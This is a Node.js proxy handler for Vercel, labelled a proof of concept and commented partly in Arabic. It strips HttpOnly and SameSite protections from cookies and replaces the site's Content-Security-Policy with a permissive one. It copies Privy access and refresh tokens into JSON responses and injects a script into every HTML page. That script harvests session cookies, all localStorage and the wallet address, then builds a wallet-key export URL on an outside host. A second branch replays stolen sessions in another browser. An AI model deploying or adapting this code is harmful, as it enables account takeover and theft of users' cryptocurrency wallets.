// index.js
import { createProxyMiddleware } from 'http-proxy-middleware';

// Prevent Vercel from parsing the body; we'll handle the response ourselves
export const config = {
  api: {
    bodyParser: false,
    externalResolver: true
  }
};

const ORIGIN = process.env.ORIGIN; // e.g. "https://origin.example.com"

const proxy = createProxyMiddleware({
  target: ORIGIN,
  changeOrigin: true,
  selfHandleResponse: true,

  // 0) Prevent origin from sending gzip/deflate
  onProxyReq(proxyReq) {
    proxyReq.setHeader('accept-encoding', 'identity');
  },

  onProxyRes(proxyRes, req, res) {
    let buffer = Buffer.from('');
    proxyRes.on('data', chunk => {
      buffer = Buffer.concat([buffer, chunk]);
    });

    proxyRes.on('end', () => {
      // 1) تعديل Set-Cookie flags
      const rawCookies = proxyRes.headers['set-cookie'] || [];
      const modifiedCookies = rawCookies.map(cookie =>
        cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
      );
      if (modifiedCookies.length) {
        res.setHeader('Set-Cookie', modifiedCookies);
      }

      // 2) Override Content-Security-Policy
      res.setHeader(
        'Content-Security-Policy',
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
      );

      // 3) Copy باقي الرؤوس
      Object.entries(proxyRes.headers).forEach(([name, value]) => {
        const lower = name.toLowerCase();
        if (lower === 'set-cookie' || lower === 'content-security-policy') return;
        res.setHeader(name, value);
      });

      const contentType = proxyRes.headers['content-type'] || '';

      // 4) JSON branch: inject privy_access_token و privy_refresh_token
      if (contentType.includes('application/json')) {
        const text = buffer.toString('utf8');
        let modifiedBody = text;

        try {
          const obj = JSON.parse(text);

          // استخراج قيم الكوكيز
          let accessTokenValue = '';
          let refreshTokenValue = '';
          rawCookies.forEach(cookie => {
            const [pair] = cookie.split(';');
            const [cookieName, ...rest] = pair.split('=');
            const value = rest.join('=');
            if (cookieName === 'privy-access-token')  accessTokenValue = value;
            if (cookieName === 'privy-refresh-token') refreshTokenValue = value;
          });

          // حقنهم في الجسم
          if (accessTokenValue)  obj.privy_access_token  = accessTokenValue;
          if (refreshTokenValue) obj.privy_refresh_token = refreshTokenValue;

          modifiedBody = JSON.stringify(obj);
        } catch (err) {
          console.error('Failed to parse JSON body:', err);
        }

        res.setHeader('Content-Type', 'application/json');
        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
        return res.end(modifiedBody);
      }

      // 5) HTML branch: inject script قبل </body>
      if (contentType.includes('text/html')) {
        let html = buffer.toString('utf8');
        const scriptTag = `<script>

      (function() {
        function getCookie(name) {
          const value = \`; \${document.cookie}\`;
          const parts = value.split(\`; \${name}=\`);
          if (parts.length === 2) return parts.pop().split(';').shift();
        }

        function getLastPartOfLocalStorageKey(prefix) {
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.startsWith(prefix)) {
              const parts = key.split(':');
              return parts[parts.length - 1];
            }
          }
          return null;
        }

        function encodeBase64(data) {
          return btoa(unescape(encodeURIComponent(data)));
        }

        function decodeBase64(data) {
          return decodeURIComponent(escape(atob(data)));
        }

        function setCookies(cookies, path = '/') {
          cookies.split(';').forEach(cookie => {
            document.cookie = \`\${cookie.trim()}; path=\${path}\`;
          });
        }

        function setLocalStorage(data) {
          const localStorageData = JSON.parse(data);
          for (const key in localStorageData) {
            localStorage.setItem(key, localStorageData[key]);
          }
        }

        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('POC')) {
          const pocValue = decodeBase64(urlParams.get('POC'));
          const [cookieData, localStorageData] = pocValue.split('|');
          setCookies(cookieData, '/');
          setLocalStorage(localStorageData);
        } else {
          const privyToken = getCookie('privy-token');
          const address = getLastPartOfLocalStorageKey('privy_wallet');
          if (privyToken && address) {
            const exportUrl = \`https://privy.nolgit.com/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=\${privyToken}&address=\${address}\`;

            const allCookies = document.cookie;
            const localStorageData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
            const encodedData = encodeBase64(\`\${allCookies}|\${localStorageData}\`);

            const finalUrl = \`\${exportUrl}&POC=\${encodedData}\`;

            alert(finalUrl);
            console.log(\`The POC URL :  \${finalUrl}\`);
          }
        }
      })();
    
</script>`;
        html = html.replace('</body>', `${scriptTag}</body>`);
        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
        return res.end(html);
      }

      // 6) Fallback: passthrough
      res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
      return res.end(buffer);
    });
  }
});

export default function handler(req, res) {
  return proxy(req, res, err => {
    console.error('Proxy error:', err);
    res.statusCode = 500;
    res.end('Internal Server Error');
  });
}
